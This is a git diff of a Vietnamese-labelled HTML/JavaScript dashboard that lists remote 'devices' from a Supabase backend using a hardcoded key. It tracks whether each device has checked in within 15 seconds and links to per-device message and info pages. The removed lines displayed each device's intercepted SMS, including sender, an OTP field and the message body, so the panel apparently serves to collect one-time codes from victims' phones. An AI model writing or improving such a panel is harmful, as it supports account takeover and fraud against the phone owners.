@@ -2,125 +2,147 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>SMS Device</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Devices</title>
 
 <style>
 body {
-  background: #0f172a;
-  color: white;
-  font-family: Arial;
-  padding: 20px;
+  background:#0f172a;
+  color:white;
+  font-family:Arial;
+  margin:0;
+}
+
+.container {
+  max-width:900px;
+  margin:auto;
+  padding:15px;
 }
 
 .device {
-  background: #1e293b;
-  padding: 10px;
-  margin: 8px 0;
-  border-radius: 8px;
-  cursor: pointer;
+  background:#1e293b;
+  padding:15px;
+  margin:10px 0;
+  border-radius:10px;
+  transition:0.2s;
 }
 
-.online { border-left: 5px solid #22c55e; }
-.offline { border-left: 5px solid #ef4444; }
+.device:hover {
+  transform:scale(1.01);
+}
 
-.sms {
-  margin-top: 10px;
-  background: #020617;
-  padding: 10px;
-  border-radius: 6px;
+.online { border-left:5px solid #22c55e; }
+.offline { border-left:5px solid #ef4444; }
+
+.name {
+  font-size:18px;
+  font-weight:bold;
+}
+
+.status {
+  margin-top:5px;
+}
+
+.actions {
+  margin-top:10px;
+}
+
+button {
+  margin-right:6px;
+  margin-top:6px;
+  padding:6px 10px;
+  border:none;
+  border-radius:6px;
+  background:#3b82f6;
+  color:white;
+  cursor:pointer;
+}
+
+button:hover {
+  opacity:0.8;
+}
+
+/* mobile */
+@media (max-width:600px){
+  .name { font-size:16px; }
+  button { width:100%; }
 }
 </style>
-
 </head>
+
 <body>
 
-<h2>📱 Thiết bị</h2>
-<div id="devices"></div>
+<div class="container">
+  <h2>📱 Thiết bị</h2>
+  <div id="list"></div>
+</div>
 
 <script>
 const BASE = "https://zxewnhxxojggatsyukif.supabase.co/rest/v1/";
 const KEY = "sb_publishable_AGpmkNidqBHY_dnz_TRJ0g_ZarfbeQi";
 
 let devices = [];
-let sms = [];
 
-async function load() {
+async function load(){
+  try {
+    devices = await fetch(BASE + "devices?order=created_at.desc", {
+      headers: {
+        "apikey": KEY,
+        "Authorization": "Bearer " + KEY
+      }
+    }).then(r => r.json());
 
-  // lấy devices
-  const d = await fetch(BASE + "devices", {
-    headers: {
-      "apikey": KEY,
-      "Authorization": "Bearer " + KEY
-    }
-  }).then(res => res.json());
-
-  // lấy sms
-  const s = await fetch(BASE + "sms?order=created_at.desc", {
-    headers: {
-      "apikey": KEY,
-      "Authorization": "Bearer " + KEY
-    }
-  }).then(res => res.json());
-
-  devices = d;
-  sms = s;
-
-  render();
+    render();
+  } catch(e){
+    console.log("LOAD ERROR", e);
+  }
 }
 
-function render() {
-  const container = document.getElementById("devices");
-  container.innerHTML = "";
+function render(){
+  const box = document.getElementById("list");
+  box.innerHTML = "";
 
   const now = new Date();
 
   devices.forEach(d => {
 
-    // sms của máy này
-    const list = sms.filter(x => x.device_id === d.id);
+    const last = new Date(d.last_seen || 0);
+    const diff = now - last;
 
-    // trạng thái online
-    const last = new Date(d.last_seen || d.created_at || 0);
-    const isOnline = (now - last) < 60000;
+    // 👉 15s là offline
+    const isOnline = diff < 15000;
 
     const div = document.createElement("div");
     div.className = "device " + (isOnline ? "online" : "offline");
 
     div.innerHTML = `
-      <b>${d.device_name}</b><br>
-      ${isOnline ? "🟢 Online" : "🔴 Offline"}<br>
-      <button onclick="deleteDevice('${d.id}', event)">🗑 Xoá</button>
+      <div class="name">${d.device_name || "Unknown device"}</div>
+
+      <div class="status">
+        ${isOnline ? "🟢 Online" : "🔴 Offline"}
+      </div>
+
+      <div class="actions">
+        <button onclick="openSMS('${d.id}')">📩 Tin nhắn</button>
+        <button onclick="openInfo('${d.id}')">ℹ️ Thông tin</button>
+        <button onclick="deleteDevice('${d.id}')">🗑 Xoá</button>
+      </div>
     `;
 
-    div.onclick = () => showSMS(d.id, div);
-
-    container.appendChild(div);
+    box.appendChild(div);
   });
 }
 
-function showSMS(deviceId, element) {
-
-  const list = sms.filter(s => s.device_id === deviceId);
-
-  let html = "<div class='sms'>";
-
-  list.forEach(s => {
-    html += `
-      📨 ${s.sender}<br>
-      🔢 ${s.otp}<br>
-      📩 ${s.content}
-      <hr>
-    `;
-  });
-
-  html += "</div>";
-
-  element.querySelectorAll(".sms").forEach(e => e.remove());
-  element.insertAdjacentHTML("beforeend", html);
+function openSMS(id){
+  location.href = "chucnang/sms/sms.html?device=" + id;
 }
 
-function deleteDevice(id, e) {
-  e.stopPropagation();
+function openInfo(id){
+  location.href = "chucnang/thongtin/thongtin.html?device=" + id;
+}
+
+function deleteDevice(id){
+  if (!confirm("Xoá thiết bị này?")) return;
 
   fetch(BASE + "devices?id=eq." + id, {
     method: "DELETE",
@@ -131,8 +153,11 @@ function deleteDevice(id, e) {
   }).then(() => load());
 }
 
+// load lần đầu
 load();
-setInterval(load, 3000);
+
+// realtime giả (5s)
+setInterval(load, 5000);
 </script>
 
 </body>
